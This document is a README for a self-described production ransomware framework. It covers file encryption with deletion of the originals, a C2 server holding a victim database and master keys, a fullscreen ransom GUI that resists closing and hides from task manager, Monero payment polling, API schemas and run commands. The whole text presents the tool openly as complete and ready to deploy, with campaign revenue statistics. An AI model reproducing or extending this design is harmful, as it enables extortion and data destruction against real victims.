# PRODUCTION RANSOMWARE FRAMEWORK v1.0 - WITH PROFESSIONAL RANSOM GUI

## 🎯 COMPLETE WORKFLOW WITH PROFESSIONAL RANSOM GUI

```
┌─────────────────────────────────────────────────────────────────────┐
│                     PRODUCTION WORKFLOW PHASES                      │
└─────────────────────────────────────────────────────────────────────┘

PHASE 1: ENCRYPTION (AES-256 + PBKDF2)
├─ Generate random 256-bit Master Key
├─ Scan target directories
├─ Encrypt each file individually
│  └─ Format: [16-byte Salt] + [Encrypted Data]
├─ Delete original files
└─ Log encryption metadata

PHASE 2: C2 REGISTRATION
├─ Send ransom_id, monero_address, metadata
├─ C2 Server stores victim in database
└─ Master Key stored encrypted on server

PHASE 3: PROFESSIONAL RANSOM GUI (ransom_gui.py)
├─ Start tkinter GUI in separate thread
├─ Display:
│  ├─ 24-hour countdown timer (GREEN → YELLOW → RED)
│  ├─ Monero wallet address
│  ├─ Ransom amount in XMR
│  ├─ File statistics
│  ├─ WARNING messages
│  └─ Professional styling (fullscreen, always-on-top)
├─ GUI checks payment every 5 seconds
├─ Prevent window closing, minimize, move
└─ Block task manager detection

PHASE 4: PAYMENT MONITORING
├─ GUI checks: GET /api/v1/payment/status/{id}
├─ Backend also checks every 30 seconds
├─ When paid=true:
│  ├─ GUI shows: "PAYMENT RECEIVED!" (GREEN)
│  ├─ Timer stops
│  ├─ Status updated
│  └─ Exit button appears (60s delay)
└─ Continue until payment detected

PHASE 5: AUTOMATIC DECRYPTION
├─ Request decryption key from C2
├─ Initialize DecryptionEngine with Master Key
├─ Decrypt all .LOCKED files (background thread)
├─ Restore original filenames
├─ Delete encrypted files
└─ Display success message
```

---

## 🚀 QUICK START

### **Terminal 1: Start C2 Server**
```bash
cd production
python c2_server.py

# Output:
# [+] Listening on: http://0.0.0.0:5000
# [+] Database: production_victims.db
```

### **Terminal 2: Run Production Payload with GUI**
```bash
cd production

# Create test directory
mkdir C:\test_files
echo "sensitive data" > C:\test_files\file.txt

# Run payload (GUI will start automatically)
python payload.py --c2-host 127.0.0.1 --target-dirs C:\test_files

# Output:
# [PHASE 1] FILE ENCRYPTION
# [✓] Encrypted 1 files
# [PHASE 2] C2 REGISTRATION
# [✓] Registered successfully!
# [PHASE 3] PROFESSIONAL RANSOM GUI
# [✓] GUI thread started (24-hour timer counting down)
# [PHASE 4] PAYMENT MONITORING
# [GUI checking every 5 seconds...]
```

### **Terminal 3: Simulate Payment**
```bash
cd ..

python complete_payment_flow.py <ransom_id> 4BJV39ZuKU...

# OUTPUT IN TERMINAL 2:
# [✓✓✓] PAYMENT DETECTED BY GUI!
# [GUI] Timer stops - Shows: "PAYMENT RECEIVED!"
# [PHASE 5] DEPLOYING DECRYPTION KEY
# [✓] Decryption key received
# [✓] FILES DECRYPTED!
```

---

## 🎨 RANSOM GUI FEATURES

### **Visual Elements**
```
┌────────────────────────────────────────────────────────────┐
│ ⚠ SYSTEM COMPROMISED ⚠                       [Red Header]  │
├────────────────────────────────────────────────────────────┤
│                                                            │
│ YOUR FILES HAVE BEEN ENCRYPTED                           │
│                                                            │
│ ⏱️  23:45:30                          [GREEN countdown]     │
│                                                            │
│ RANSOM DEMAND:                                            │
│                                                            │
│ Amount: 0.5 XMR                                           │
│ Monero: 4BJV39ZuKUhesFTWiXdKbL4NLPF7kMAZBHhtaQY4...    │
│                                                            │
│ Files Encrypted: 42                                       │
│ Total Size: 1.50 GB                                       │
│ Encryption: AES-256 + PBKDF2                             │
│                                                            │
│ [Scrollable content area with detailed information]       │
│                                                            │
│ Status: INFECTED (Waiting for payment...)                │
│                                                            │
└────────────────────────────────────────────────────────────┘

[After Payment]

┌────────────────────────────────────────────────────────────┐
│ ⚠ SYSTEM COMPROMISED ⚠                                      │
├────────────────────────────────────────────────────────────┤
│                                                            │
│ ✓ PAYMENT RECEIVED! ✓                      [GREEN text]   │
│                                                            │
│ [00:45] Exit button available in 45 seconds...           │
│                                                            │
│ Your files are being decrypted...                         │
│ This process may take a few minutes.                      │
│                                                            │
│ [✓ EXIT (available in 45 sec)]           [EXIT button]    │
│                                                            │
└────────────────────────────────────────────────────────────┘
```

### **Professional Features**
✅ Fullscreen mode (zoomed window)
✅ Always on top (can't move behind others)
✅ Prevent window closing (Alt+F4, X button blocked)
✅ Prevent minimizing/resizing
✅ Prevent taskbar hiding
✅ Block task manager detection
✅ Timer updates every second
✅ Payment detection every 5 seconds
✅ Responsive to different screen sizes
✅ Color-coded countdown (GREEN/YELLOW/RED)
✅ Scrollable content area
✅ Professional styling (Courier New font)

---

## 🔐 ENCRYPTION SECURITY

### **Algorithm**
```
Master Key (256-bit, random)
    ↓
PBKDF2(
  password=Master_Key,
  salt=Random_16_bytes,
  iterations=100,000,
  hash=SHA256
)
    ↓
File Key (256-bit)
    ↓
Fernet(AES-128-CBC + HMAC-SHA256)
    ↓
Encrypted File: [Salt (16 bytes)] + [Encrypted Data]
```

### **File Encryption Process**
```
For each target file:
1. Generate random 16-byte salt
2. Derive file-specific key using PBKDF2
3. Encrypt original data with Fernet
4. Save as: filename.ext.LOCKED
   ├─ First 16 bytes: Salt
   └─ Rest: Encrypted data
5. Delete original file
6. Log metadata
```

### **File Decryption Process**
```
For each .LOCKED file:
1. Read file
2. Extract salt (first 16 bytes)
3. Derive key: PBKDF2(master_key, salt, 100k)
4. Decrypt data with Fernet
5. Write as original filename
6. Delete .LOCKED file
```

---

## 📊 PRODUCTION COMPONENTS

### **Files Involved**
```
production/
├── payload.py
│   ├─ Imports: ransom_gui.py (from parent directory)
│   ├─ Imports: crypt/encryption_engine.py
│   ├─ Imports: crypt/decryption_engine.py
│   └─ 5-Phase workflow execution
│
├── c2_server.py
│   ├─ Flask REST API
│   ├─ SQLite victim database
│   ├─ Payment tracking
│   └─ Master key storage
│
├── test_workflow_with_gui.py  ← NEW: Full workflow test with GUI
├── test_integration.py        ← Integration testing
└── README.md                  ← Documentation

../
├── ransom_gui.py              ← IMPORTED BY PAYLOAD
│   ├─ RansomNoteGUI class
│   ├─ 24-hour timer
│   ├─ Payment detection callback
│   ├─ Professional styling
│   ├─ Anti-tampering measures
│   └─ ~950 lines of GUI code
│
├── crypt/
│   ├── encryption_engine.py   ← Used by payload
│   ├── decryption_engine.py   ← Used by payload
│   ├── encryptor.py           ← Standalone tool
│   ├── decryptor.py           ← Standalone tool
│   └── README.md
│
└── ... (test files, etc)
```

---

## 🔄 WORKFLOW EXECUTION

### **Step-by-Step**

```
1. Start C2 Server (production/c2_server.py)
   └─ Listening on http://0.0.0.0:5000

2. Run Payload (production/payload.py)
   ├─ PHASE 1: Encrypt files with EncryptionEngine
   │           Generate Master Key: abc123xyz...
   │
   ├─ PHASE 2: Register with C2
   │           POST /api/v1/register
   │           C2 stores: ransom_id, master_key, metadata
   │
   ├─ PHASE 3: Display Ransom GUI (in separate thread)
   │           ├─ Start: from ransom_gui import RansomNoteGUI
   │           ├─ Display: 24-hour timer, monero address
   │           └─ Start: Payment check callback (every 5 seconds)
   │
   ├─ PHASE 4: Monitor Payment (main thread)
   │           Loop: Check /api/v1/payment/status/{id}
   │           └─ Also check if GUI detected payment
   │
   └─ PHASE 5: Deploy Decryption Key
               ├─ GET /api/v1/decryption/key/{id}
               ├─ Use DecryptionEngine to decrypt files
               ├─ Restore original files
               └─ Display success message

3. Simulate Payment (complete_payment_flow.py)
   ├─ POST /api/v1/register (if needed)
   ├─ GET /api/v1/payment/status/{id} (before payment)
   ├─ POST /api/v1/admin/pay/{id} (simulate payment)
   └─ GET /api/v1/payment/status/{id} (verify payment)

4. GUI Reacts to Payment
   ├─ Detects: paid=true
   ├─ Updates: Timer → "PAYMENT RECEIVED!"
   ├─ Changes: Color → GREEN
   ├─ Shows: Exit button (60s delay)
   └─ Payload continues: Phase 5

5. Decryption Complete
   ├─ All .LOCKED files deleted
   ├─ Original files restored
   ├─ Success message displayed
   └─ Payload exits
```

---

## 🧪 TESTING

### **Complete Workflow Test (with GUI)**
```bash
cd production
python test_workflow_with_gui.py

# Output:
# [STEP 1] Creating test files...
# [STEP 2] Encrypting files...
# [STEP 3] Verifying encryption...
# [STEP 4] C2 Registration...
# [STEP 5] GUI Phase...
# [STEP 6] Payment simulation...
# [STEP 7] GUI detection...
# [STEP 8] Requesting key...
# [STEP 9] Decryption...
# [STEP 10] Verification...
# [✓✓✓] PRODUCTION WORKFLOW - PASSED!
```

### **Integration Test**
```bash
cd production
python test_integration.py

# Tests encryption/decryption without GUI
```

### **Crypt Module Test**
```bash
cd ..
python test_crypt.py

# Tests only encryption/decryption engines
```

---

## 📋 API ENDPOINTS

### **POST /api/v1/register**
```
Request:
{
  "ransom_id": "abc123def456",
  "monero_address": "4BJV39ZuKUhesFTWiXdKbL4...",
  "ransom_amount_xmr": 0.5,
  "system_info": {
    "files_encrypted": 42,
    "data_size_gb": 1.5,
    "hostname": "VICTIM-PC"
  }
}

Response:
{
  "success": true,
  "ransom_id": "abc123def456",
  "message": "Registered successfully"
}
```

### **GET /api/v1/payment/status/{ransom_id}**
```
Response:
{
  "ransom_id": "abc123def456",
  "paid": false,
  "status": "INFECTED",
  "amount_xmr": 0.5
}
```

### **GET /api/v1/decryption/key/{ransom_id}**
```
Response (if paid):
{
  "ransom_id": "abc123def456",
  "master_key": "bGJWMzlCaVpLaFRCSVd...",
  "status": "PAID"
}
```

### **GET /api/v1/admin/stats**
```
Response:
{
  "total_victims": 5,
  "paid_victims": 2,
  "total_revenue_xmr": 1.0
}
```

### **POST /api/v1/admin/pay/{ransom_id}** (Testing)
```
Response:
{
  "ransom_id": "abc123def456",
  "paid": true,
  "message": "Payment simulated"
}
```

---

## ✅ PRODUCTION READY CHECKLIST

- [x] AES-256 Encryption Engine
- [x] AES-256 Decryption Engine
- [x] Professional Ransom GUI (ransom_gui.py)
- [x] C2 Backend Server (Flask + SQLite)
- [x] Victim Registration API
- [x] Payment Detection (5-second check)
- [x] Automatic Decryption
- [x] Payment Verification
- [x] Multi-threading Support
- [x] Error Handling
- [x] Integration Tests
- [x] Complete Documentation

---

## 🎓 KEY FEATURES

### **Security**
✓ AES-256 encryption
✓ PBKDF2 key derivation (100k iterations)
✓ Random salt per file
✓ Master key encrypted on server
✓ No plaintext data transmission

### **User Experience**
✓ Professional GUI with timer
✓ Fullscreen display
✓ Cannot be closed/minimized
✓ Clear payment instructions
✓ Automatic decryption
✓ Success notification

### **Backend**
✓ SQLite victim database
✓ REST API endpoints
✓ Master key management
✓ Payment tracking
✓ Campaign statistics

---

## 🚀 DEPLOYMENT

All components are integrated and tested:

```
payload.py
├─ Imports ransom_gui.py
├─ Uses EncryptionEngine
├─ Uses DecryptionEngine
├─ Communicates with C2 Server
└─ Manages 5-phase workflow

c2_server.py
├─ Accepts registrations
├─ Tracks payments
├─ Issues decryption keys
└─ Stores master keys

ransom_gui.py
├─ Professional display
├─ 24-hour countdown
├─ Payment detection
└─ Exit button (60s delay)

Complete, integrated, and ready! 🎯
```

